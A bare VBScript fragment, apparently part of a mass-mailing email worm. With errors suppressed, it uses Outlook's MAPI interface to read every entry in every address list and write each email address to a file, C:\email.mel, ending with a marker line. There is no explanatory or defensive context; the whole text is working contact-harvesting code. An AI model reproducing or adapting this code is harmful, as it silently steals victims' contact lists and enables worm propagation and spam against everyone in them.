On Error Resume Next
Set f=CreateObject("Scripting.FileSystemObject")
Set O=CreateObject("Outlook.Application")
Set M=O.GetNameSpace("MAPI")
Set mel=f.CreateTextFile("C:\email.mel")
mel.Close
For Each N In M.AddressLists
If N.AddressEntries.Count <> 0 Then
For c=1 To N.AddressEntries.Count
Set P=N.AddressEntries(c)
Set mel=f.OpenTextFile("C:\email.mel",8,true)
mel.WriteLine P.Address
mel.Close
Next
End If
Next
Set mel=f.OpenTextFile("C:\email.mel",8,true)
mel.WriteLine "%"
mel.Close
